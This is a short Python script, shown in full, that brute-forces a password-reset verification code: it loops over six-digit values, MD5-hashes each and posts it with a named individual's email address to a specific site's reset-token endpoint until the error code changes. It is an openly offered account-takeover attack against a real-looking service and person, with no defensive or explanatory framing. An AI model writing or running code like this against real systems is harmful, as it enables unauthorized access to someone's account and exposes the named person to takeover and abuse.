import requests,hashlib,json

url = "https://feleb.zhejiangzhongjian.com/basic-api/user/pwd-reset/reset/token"
for i in range(599000,999999):
    hashstr = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    req = requests.post(url=url,json={"email":"minzhi.zhou@geely.com","verificationCodeMd5":f"{hashstr}"})
    data = json.loads(req.text)
    print(i)
    if data.get('code') != 100102:
        break
